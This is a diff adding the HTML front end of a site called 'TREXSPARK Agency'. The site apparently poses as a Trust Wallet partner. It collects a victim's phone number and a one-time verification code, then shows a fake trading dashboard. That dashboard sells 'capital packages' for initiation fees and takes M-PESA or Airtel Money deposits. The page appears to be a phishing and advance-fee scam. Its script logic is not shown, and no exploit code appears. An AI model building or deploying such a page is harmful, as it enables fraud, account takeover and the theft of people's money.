@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>TREXSPARK Agency</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800;900&display=swap" rel="stylesheet">
+  <!-- The ?v=2 forces the browser to load the new CSS -->
+  <link rel="stylesheet" href="style.css?v=2" />
+</head>
+<body>
+
+  <!-- SPLASH SCREEN -->
+  <div id="splash">
+    <h1 class="splash-title">Welcome to <br><span>TREXSPARK Agency</span></h1>
+    <p class="splash-motto">Beyond Limits. Beyond Expectations.</p>
+  </div>
+
+  <!-- NAVBAR -->
+  <header class="topbar" id="main-navbar" style="display: none;">
+    <div class="logo" onclick="navTo('page-dashboard')">TREX<span>SPARK</span></div>
+    <nav>
+      <a href="#" onclick="navTo('page-dashboard')">Dashboard</a>
+      <a href="#" onclick="navTo('page-trading')">Trading Hub</a>
+      <a href="#" onclick="logout()" style="color: #e50914;">Logout</a>
+    </nav>
+  </header>
+
+  <!-- PAGE 1: LANDING -->
+  <div id="page-landing" style="display: none;">
+    <section class="hero">
+      <div class="hero-content">
+        <h1 style="font-size: clamp(32px, 5vw, 56px); line-height: 1.1;">Access Your <br><span>Trust Wallet</span> Linked Account</h1>
+        <p style="font-size: 16px; margin-bottom: 30px;">Experience premium trading and financial services without the hassle. Securely connect your mobile money.</p>
+        <button onclick="navTo('page-login')" class="cta" style="border:none; cursor:pointer; font-size: 16px; padding: 16px 30px;">
+          Proceed to Get Started →
+        </button>
+      </div>
+      <div class="hero-image">
+        <img src="https://images.unsplash.com/photo-1551288049-bebda4e38f71?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80" alt="Dashboard">
+      </div>
+    </section>
+  </div>
+
+  <!-- PAGE 2: LOGIN -->
+  <div id="page-login" style="display: none;">
+    <div class="auth-container">
+      <div class="card">
+        <button class="back" onclick="navTo('page-landing')" style="margin-bottom:20px;">← Back</button>
+        <h2>Link Your Account</h2>
+        <p class="summary" style="background: none; padding: 0;">Enter your mobile number to receive a verification code.</p>
+        
+        <label>Country</label>
+        <select id="login-country">
+          <option value="KE" data-placeholder="712345678">🇰🇪 Kenya</option>
+          <option value="ZM" data-placeholder="971234567">🇿🇲 Zambia</option>
+          <option value="NG" data-placeholder="8012345678">🇳🇬 Nigeria</option>
+          <option value="ZA" data-placeholder="821234567">🇿🇦 South Africa</option>
+        </select>
+
+        <label>Phone Number</label>
+        <input type="tel" id="login-phone" placeholder="712345678" inputmode="numeric" />
+        
+        <button class="pay" type="button" onclick="goToOtp()">Send Code</button>
+        <p class="error" id="login-error"></p>
+      </div>
+    </div>
+  </div>
+
+  <!-- PAGE 3: OTP -->
+  <div id="page-otp" style="display: none;">
+    <div class="auth-container">
+      <div class="card">
+        <h2>Verify Number</h2>
+        <p class="summary" id="otp-text" style="background: none; padding: 0;">Code has been sent to your linked account.</p>
+        
+        <label>4-Digit Code</label>
+        <input type="tel" id="otp-input" placeholder="••••" inputmode="numeric" maxlength="4" style="letter-spacing: 10px; text-align: center; font-size: 24px;" />
+        
+        <button class="pay" type="button" onclick="verifyOtp()">Verify & Proceed</button>
+        <p class="error" id="otp-error"></p>
+      </div>
+    </div>
+  </div>
+
+  <!-- PAGE 4: DASHBOARD -->
+  <div id="page-dashboard" style="display: none;">
+    <section class="dashboard-hero">
+      <div class="live-banner">
+        <div class="pulse-dot"></div>
+        <span>Live Integration Active</span>
+        <strong>In Partnership with Trust Wallet</strong>
+      </div>
+      <h1>Welcome Back</h1>
+      <p class="charming-text">Your journey to financial freedom begins now. You have secured access to TREXSPARK's exclusive ecosystem.</p>
+      <div style="margin-top: 40px; display: flex; gap: 20px; justify-content: center; flex-wrap: wrap;">
+        <button onclick="navTo('page-trading')" class="cta" style="border:none; cursor:pointer;">Go to Trading Dashboard</button>
+      </div>
+    </section>
+  </div>
+
+  <!-- PAGE 5: TRADING -->
+  <div id="page-trading" style="display: none;">
+    <div class="trading-dashboard-container">
+      <div class="account-overview">
+        <p>Account overview</p>
+        <h1>$0.00</h1>
+        <span>Example balance · Connect your account to show actual data</span>
+      </div>
+
+      <div class="trading-grid">
+        <div class="grid-card" onclick="toggleInitiation()">
+          <div class="icon">💼</div>
+          <h3>Trade Initiation</h3>
+          <p>Choose a capital package</p>
+        </div>
+        <div class="grid-card" onclick="alert('Swap-Free Account request sent to broker.')">
+          <div class="icon">🛡️</div>
+          <h3>Swap-Free</h3>
+          <p>Request premium access</p>
+        </div>
+        <div class="grid-card" onclick="alert('Loading top 10 trader profiles...')">
+          <div class="icon">👥</div>
+          <h3>Copy Trading</h3>
+          <p>Explore ten trader profiles</p>
+        </div>
+        <div class="grid-card" onclick="alert('Live Signals:\nEUR/USD BUY @ 1.0850\nGOLD SELL @ 2320')">
+          <div class="icon">📈</div>
+          <h3>Signals</h3>
+          <p>View trading opportunities</p>
+        </div>
+      </div>
+
+      <div id="initiation-packages" style="display: none; margin-top: 40px; border-top: 1px solid #222; padding-top: 30px;">
+        <h2 style="text-align: left; margin-bottom: 20px; font-size: 24px;">Select Capital Package</h2>
+        
+        <div class="package-card">
+          <div class="pkg-icon">📊</div>
+          <div class="pkg-info">
+            <h4>Starter package</h4>
+            <h2>$200 <span>capital</span></h2>
+            <p>Initiation fee: $10</p>
+          </div>
+          <button class="choose" onclick="initiateTrade('Starter', '10')" style="width:auto; padding: 10px 20px;">Select</button>
+        </div>
+        <div class="package-card">
+          <div class="pkg-icon">📊</div>
+          <div class="pkg-info">
+            <h4>Silver package</h4>
+            <h2>$500 <span>capital</span></h2>
+            <p>Initiation fee: $20</p>
+          </div>
+          <button class="choose" onclick="initiateTrade('Silver', '20')" style="width:auto; padding: 10px 20px;">Select</button>
+        </div>
+        <div class="package-card">
+          <div class="pkg-icon">📊</div>
+          <div class="pkg-info">
+            <h4>Gold package</h4>
+            <h2>$700 <span>capital</span></h2>
+            <p>Initiation fee: $50</p>
+          </div>
+          <button class="choose" onclick="initiateTrade('Gold', '50')" style="width:auto; padding: 10px 20px;">Select</button>
+        </div>
+      </div>
+
+      <div class="risk-warning">
+        <strong>Risk Warning:</strong> Trading involves significant risk. The balance shown is an example and not a connected live account.
+      </div>
+    </div>
+  </div>
+
+  <!-- PAGE 6: FUND DEPOSIT -->
+  <div id="page-pay" style="display: none; background: #000; min-height: 100vh;">
+    <div class="deposit-header">
+      <button class="back-icon" onclick="navTo('page-trading')">←</button>
+      <h2>Fund Deposit</h2>
+    </div>
+
+    <div class="deposit-container">
+      <div class="wallet-select">
+        <span>Wallet ID: 65424113 - 0.0 USD</span>
+        <span style="color: #555;">▼</span>
+      </div>
+
+      <div class="method-grid">
+        <div class="method-box"><div class="m-icon">💳</div> Alternative</div>
+        <div class="method-box"><div class="m-icon">🏦</div> Bank Transfers</div>
+        <div class="method-box"><div class="m-icon">💳</div> Credit/Debit Cards</div>
+        <div class="method-box"><div class="m-icon">🎥</div> All</div>
+      </div>
+
+      <button class="change-method-btn"><span style="margin-right: 10px;">←</span> Change Deposit Method</button>
+
+      <div class="deposit-form-card">
+        <div class="form-header">
+          <select id="deposit-provider" style="background: #111; color: #fff; border: 1px solid #333; padding: 8px; border-radius: 6px; font-weight: bold;">
+            <option value="MPESA">Safaricom - MPESA</option>
+            <option value="AIRTEL">Airtel Money</option>
+          </select>
+          <span id="provider-logo" style="color: #2ecc71; font-weight: 900; font-style: italic;">M-PESA</span>
+        </div>
+
+        <div class="warning-box">
+          <div class="w-icon">ℹ️</div>
+          <div class="w-text">
+            <h4>Important instructions before making the payment</h4>
+            <p>• Third Party Transactions are Prohibited. Any violation to this term may result in your account termination.</p>
+          </div>
+        </div>
+
+        <label>Enter Amount</label>
+        <div class="input-row">
+          <select id="pay-currency">
+            <option value="KES">KES</option>
+            <option value="USD">USD</option>
+          </select>
+          <input type="number" id="pay-amount-input" placeholder="0" />
+        </div>
+
+        <div class="quick-amounts">
+          <button onclick="setAmount(1000)">+1,000</button>
+          <button onclick="setAmount(10000)">+10,000</button>
+          <button onclick="setAmount(50000)">+50,000</button>
+        </div>
+
+        <div class="exchange-rate">
+          <p>Amount: <strong id="calc-usd">0 USD</strong> | Rate: 1 KES = 0.007695 USD</p>
+          <p>1 USD = 129.96 KES ⓘ</p>
+        </div>
+
+        <label>Mobile Phone Number (e.g. 254 XXX XXX XXX)</label>
+        <input type="tel" id="pay-phone-input" placeholder="254 719780991" style="margin-bottom: 20px;" />
+
+        <button class="deposit-btn" onclick="processPayment()">Deposit</button>
+
+        <div class="deposit-footer-info">
+          <p>Minimum: K700</p>
+          <p>Maximum: K250,000</p>
+          <p>Deposit Fees: No Fees</p>
+          <p>Processing Time: Instant</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- The ?v=3 forces the browser to load the new JS -->
+  <script src="script.js?v=3"></script>
+</body>
+  </html>
